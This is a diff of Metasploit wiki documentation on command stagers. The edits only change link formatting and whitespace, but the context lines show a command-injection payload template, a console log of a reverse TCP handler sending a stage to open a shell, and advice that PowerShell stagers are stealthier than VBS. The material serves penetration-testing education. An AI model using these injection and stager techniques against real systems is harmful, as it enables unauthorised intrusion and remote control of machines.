@@ -158,7 +158,7 @@ Now let's modify the `execute_command` method and get code execution against the
 127.0.0.1+%26%26+[Malicious commands]
 ```
 
-We do that in `execute_command` using [HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient). Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:
+We do that in `execute_command` using [[HttpClient|./How-to-Send-an-HTTP-Request-Using-HttpClient.md]]. Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:
 
 ```ruby
 def filter_bad_chars(cmd)
@@ -187,10 +187,10 @@ end
 And let's run that, we should have a shell:
 
 
-```
+```msf
 msf exploit(cmdstager_demo) > run
 
-[*] Started reverse TCP handler on 10.6.0.92:4444 
+[*] Started reverse TCP handler on 10.6.0.92:4444
 [*] Exploiting...
 [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
 [*] Sending stage (1495599 bytes) to 10.6.0.92
@@ -223,7 +223,7 @@ Available flavors:
 
 The [VBS command stager](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/vbs.rb) is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a [VBS script](https://github.com/rapid7/rex-exploitation/blob/master/data/exploits/cmdstager/vbs_b64) using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it.
 
-If you are exploiting Windows that supports Powershell, then you might want to [consider using that instead](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit) of the VBS stager, because Powershell tends to be more stealthy.
+If you are exploiting Windows that supports Powershell, then you might want to [[consider using that instead|./How-to-use-Powershell-in-an-exploit.md]] of the VBS stager, because Powershell tends to be more stealthy.
 
 To use the VBS stager, either specify your CmdStagerFlavor in the metadata:
 
